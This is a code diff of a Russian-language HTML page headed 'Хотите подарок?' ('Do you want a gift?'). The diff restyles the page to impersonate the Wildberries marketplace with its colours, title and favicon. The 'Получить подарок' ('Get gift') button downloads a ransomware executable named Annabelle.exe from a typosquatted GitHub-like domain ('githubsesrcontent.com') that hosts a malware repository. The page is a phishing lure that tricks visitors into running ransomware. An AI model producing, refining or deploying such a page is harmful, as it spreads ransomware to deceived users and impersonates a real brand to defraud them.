@@ -3,55 +3,66 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Подарок для вас</title>
+    <title>Подарок от Wildberries</title>
     <style>
         body {
-            background: linear-gradient(135deg, #89f7fe 0%, #66a6ff 100%);
+            background-color: #f5f5f7;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #fff;
-            text-align: center;
+            font-family: 'Arial', sans-serif;
+            color: #333;
         }
         .container {
-            background: rgba(0, 0, 50, 0.7);
-            padding: 40px 60px;
+            background: #fff;
+            padding: 40px 40px 50px;
             border-radius: 15px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-            max-width: 320px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+            max-width: 350px;
+            text-align: center;
         }
         h1 {
-            margin-bottom: 20px;
-            font-size: 2rem;
+            color: #8a4ca4;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
             font-weight: 700;
         }
         a.button {
-            display: inline-block;
-            background-color: #ffd700;
-            color: #000;
+            display: inline-flex;
+            align-items: center;
+            background-color: #8a4ca4;
+            color: #fff;
             text-decoration: none;
-            font-weight: bold;
-            padding: 15px 40px;
+            font-weight: 700;
+            padding: 15px 30px;
             border-radius: 30px;
-            font-size: 1.2rem;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.6);
+            font-size: 1.1rem;
+            box-shadow: 0 4px 10px rgba(138, 76, 164, 0.5);
             transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            user-select: none;
         }
         a.button:hover,
         a.button:focus {
-            background-color: #ffca00;
-            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.9);
+            background-color: #732d9a;
+            box-shadow: 0 6px 18px rgba(115, 45, 154, 0.7);
             outline: none;
+        }
+        a.button img {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Хотите подарок?</h1>
-        <a href="https://raw.githubsesrcontent.com/Da2dalus/The-MALWARE-Repo/master/Ransomware/Annabelle.exe" class="button" target="_blank" rel="noopener noreferrer">Получить подарок</a>
+        <a href="https://raw.githubsesrcontent.com/Da2dalus/The-MALWARE-Repo/master/Ransomware/Annabelle.exe" class="button" target="_blank" rel="noopener noreferrer">
+            <img src="https://www.wildberries.ru/favicon.ico" alt="Wildberries" />
+            Получить подарок
+        </a>
     </div>
 </body>
 </html>
